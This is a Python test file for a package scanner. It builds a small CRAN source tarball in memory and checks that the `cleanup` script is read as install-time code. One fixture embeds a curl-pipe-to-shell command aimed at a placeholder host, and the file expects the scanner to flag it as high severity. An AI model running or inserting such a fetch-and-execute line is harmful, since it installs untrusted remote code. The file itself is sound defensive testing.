"""A CRAN source package's `configure` and `cleanup` are install-time code the scan reads
(review 98): 11 of 300 CRAN packages were blocked because the engine never marked them."""

from __future__ import annotations

import io
import tarfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config

DESCRIPTION = (
    "Package: demo\n"
    "Title: A Demonstration Package\n"
    "Version: 1.0\n"
    "Author: A. Maintainer <maintainer@example.invalid>\n"
    "Maintainer: A. Maintainer <maintainer@example.invalid>\n"
    "Description: Demonstrates a source package with a cleanup script.\n"
    "License: GPL-3\n"
    "NeedsCompilation: yes\n"
    "Packaged: 2026-01-01 00:00:00 UTC; maintainer\n"
    "Repository: CRAN\n"
)


class CranKit:
    @staticmethod
    def scan(tmp_path: Path, cleanup: str):
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for name, text in (
                ("demo/DESCRIPTION", DESCRIPTION),
                ("demo/cleanup", cleanup),
                ("demo/R/demo.R", "f <- function() 1\n"),
            ):
                data = text.encode()
                info = tarfile.TarInfo(name)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / "demo_1.0.tar.gz"
        target.write_bytes(buffer.getvalue())
        return Scanner(Config.default().with_overrides(use_cache=False)).scan(target)


class TestCranInstallScripts:
    def test_an_ordinary_cleanup_does_not_block(self, tmp_path: Path) -> None:
        result = CranKit.scan(tmp_path, "#!/bin/sh\nrm -f src/*.o src/*.so\n")
        hooks = [f for f in result.findings if f.rule_id == "SUSPECT.INSTALL.SCRIPT.001"]
        assert hooks and all(f.severity.name in ("LOW", "MEDIUM") for f in hooks)

    def test_the_script_is_read_as_install_time_code(self, tmp_path: Path) -> None:
        cleanup = "#!/bin/sh\ncurl -s https://example.invalid/x.sh | sh\n"
        result = CranKit.scan(tmp_path, cleanup)
        assert any(
            f.location.path.endswith("demo/cleanup") and f.severity.name in ("HIGH", "CRITICAL")
            for f in result.findings
        )
